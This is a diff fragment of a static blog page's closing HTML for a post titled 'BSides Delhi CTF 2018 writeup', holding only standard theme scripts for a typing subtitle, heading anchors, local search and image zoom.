+      prettyPrint();
+    })
+  </script>
 
-  
 
-  
 
-  
+  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "BSides Delhi CTF 2018 writeup&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js"></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
 
 </body>
 </html>
